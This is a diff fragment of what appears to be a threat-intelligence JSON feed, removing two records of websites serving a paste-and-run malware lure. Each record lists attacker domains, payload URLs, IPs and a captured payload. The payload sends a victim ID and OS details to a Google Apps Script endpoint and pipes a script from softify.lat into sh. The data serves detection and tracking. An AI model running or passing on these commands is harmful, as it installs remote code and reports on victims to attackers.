@@ -10117,56 +10117,5 @@
     "ResolvedDownloadUrl": [],
     "ReportId": "cmwl1rtlh1hhu0oml900pzxyy",
     "ScannedAt": "2026-11-17T18:50:11.992000+00:00"
-  },
-  {
-    "UrlDomain": "indesigner.co.za",
-    "DeliveryUrl": [
-      "browse-cloud.codes",
-      "script.google.com",
-      "softify.lat",
-      "2findesigner.co.za",
-      "modalelement.classlist.remove",
-      "spinnerelement.style.display"
-    ],
-    "PayloadUrl": [
-      "https://softify.lat/u/f4683ebb",
-      "https://script.google.com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec",
-      "https://softify.lat/w/f4683ebb"
-    ],
-    "IP": [
-      "66.179.242.100"
-    ],
-    "Related": [],
-    "Payload": "curl -sL -d \"id=d8d74ae8-29cf-4227-8d01-a3e127c7b2dc&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Findesigner.co.za%2F&os=Linux%20x86_64&lastVisitAt=2026-11-17T17%3A19%3A50.957Z&lastShellAt=2026-11-17T17%3A19%3A50.957Z\" \"https://script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\" && curl -fsSL \"https://softify[.]lat/u/f4683ebb\" | sh",
-    "ResolvedDownloadUrl": [
-      "https://script.google.com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec",
-      "https://softify.lat/u/f4683ebb"
-    ],
-    "ReportId": "cmwkylgu31hgf0omlnkd2tiw6",
-    "ScannedAt": "2026-11-17T17:21:16.724000+00:00"
-  },
-  {
-    "UrlDomain": "goldmedical.org",
-    "DeliveryUrl": [
-      "script.google.com",
-      "browse-cloud.codes",
-      "softify.lat"
-    ],
-    "PayloadUrl": [
-      "https://softify.lat/u/f4683ebb",
-      "https://script.google.com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec",
-      "https://softify.lat/w/f4683ebb"
-    ],
-    "IP": [
-      "162.241.24.113"
-    ],
-    "Related": [],
-    "Payload": "curl -sL -d \"id=50cf6397-4597-44b0-9a37-88a0efa5a83f&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fgoldmedical[.]org%2F&os=Linux%20x86_64&lastVisitAt=2026-11-17T17%3A03%3A01.485Z&lastShellAt=2026-11-17T17%3A03%3A01.485Z\" \"https://script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\" && curl -fsSL \"https://softify[.]lat/u/f4683ebb\" | sh",
-    "ResolvedDownloadUrl": [
-      "https://script.google.com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec",
-      "https://softify.lat/u/f4683ebb"
-    ],
-    "ReportId": "cmwkxzsn51ha40oml7u9p2ams",
-    "ScannedAt": "2026-11-17T17:04:25.556000+00:00"
   }
 ]
